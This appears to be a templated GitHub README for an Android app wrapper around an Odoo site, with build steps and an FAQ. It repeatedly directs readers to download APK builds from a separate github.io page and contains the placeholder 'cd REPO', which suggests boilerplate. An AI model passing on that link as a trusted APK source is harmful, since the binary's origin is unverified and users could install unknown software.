# APEXS Mobile - Android App Wrapper 2026

> **APEXS Mobile brings the live APEXS Odoo site to Android through a native application wrapper, with Capacitor packaging, Firebase push notifications, and automated release processes.**

[![Platform](https://img.shields.io/badge/Platform-Android-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Latest-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/henry-walkerge4147/apexs-odoo-mobile-wrapper?style=flat-square)](https://github.com/henry-walkerge4147/apexs-odoo-mobile-wrapper)

---

<p align="center">
  <a href="https://henry-walkerge4147.github.io/apexs-odoo-mobile-wrapper/">
    <img src="https://img.shields.io/badge/Download-APEXS%20Mobile%20Latest-brightgreen?style=for-the-badge" alt="Download APEXS Mobile">
  </a>
</p>

> **[Download the Latest APEXS Mobile Build](https://henry-walkerge4147.github.io/apexs-odoo-mobile-wrapper/)**

---

[Download Latest Build](https://henry-walkerge4147.github.io/apexs-odoo-mobile-wrapper/)

---

## Overview

APEXS Mobile wraps the live APEXS Odoo website in a native Android shell. This gives Android users an app-based way to reach the Odoo service while keeping the live web application as the primary user interface.

The Android layer is powered by Capacitor, with Firebase Cloud Messaging available for push notifications. The build system can generate both APK and AAB packages, and includes automated branding asset generation plus GitHub Actions workflows for repeatable debug and signed release builds.

---

## Key Capabilities

- Android application shell for the live APEXS Odoo site
- Capacitor integration for the mobile application
- APK packages for direct device installation
- AAB packages for Android distribution processes
- Firebase Cloud Messaging support for push notifications
- Automatic Android app icon creation
- Automatic splash screen asset creation
- GitHub Actions workflows for debug and signed release builds

---

## Getting Started

### Download an Android package

Published Android artifacts are available from the project download page:

[Download APEXS Mobile](https://henry-walkerge4147.github.io/apexs-odoo-mobile-wrapper/)

For installation directly on an Android device, select the APK. Choose the AAB for an Android distribution workflow.

### Create a local build

Check out the repository, enter its directory, and install the web dependencies:

    git clone https://github.com/henry-walkerge4147/apexs-odoo-mobile-wrapper.git
    cd REPO
    npm install

Then copy the current web project state into the Android platform project:

    npx cap sync android

The Android project can be opened in Android Studio or built with the Android tools configured for this repository.

---

## Running the App

1. Install the APK on a compatible Android device, or place the AAB into your Android distribution process.
2. Open **APEXS Mobile** from the device's Android application menu.
3. Access the embedded APEXS Odoo website through the native wrapper.
4. Grant notification permission when push notifications are enabled in the build.
5. During development, rebuild the web project and synchronize the Android platform before generating another package.

A standard development sequence looks like this:

    npm install
    npm run build
    npx cap sync android
    npx cap open android

The exact npm scripts can depend on the repository configuration.

---

## Project Configuration

Capacitor and Android settings live in the repository project files. Native Android resources are kept within the Android project directory.

To enable Firebase Cloud Messaging, add the required Firebase Android configuration to the Android project before producing builds that use notifications. The Android asset process handles application icons and splash screen resources.

For signed releases, provide the Android build environment with the necessary signing credentials. Keep signing files and confidential secrets out of source control.

---

## Requirements

- Android hardware or an emulator for runtime testing
- Node.js and npm for installing dependencies and building the web project
- Android Studio and the Android SDK for local Android compilation
- Android tooling compatible with Capacitor
- Firebase project configuration when push notifications are required
- Network connectivity to the live APEXS Odoo site
- Adequate disk space for dependencies, Android SDK components, and generated build files

---

## Frequently Asked Questions

### How can I download the newest build?

Visit [Download Latest Build](https://henry-walkerge4147.github.io/apexs-odoo-mobile-wrapper/) to retrieve the currently published artifacts.

### Should I use the APK or AAB?

Use the APK for direct installation on an Android device. The AAB is intended for Android app distribution workflows.

### What is needed for push notifications?

APEXS Mobile uses Firebase Cloud Messaging. Before testing or publishing a notification-enabled build, configure the Android project with the required Firebase settings and notification configuration.

### What is the update process?

Pull the newest repository changes, install changed dependencies, rebuild the web application, and synchronize Capacitor before creating the next Android artifact.

### What can I do if the application fails to load?

First verify that the device can reach the network and that the live APEXS Odoo site is operating. When working with a development build, inspect the Android and Capacitor logs for synchronization or configuration problems.

### How are release packages generated?

Depending on the build and signing configuration, release artifacts can be generated from the Android project locally or through the repository's GitHub Actions workflows.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
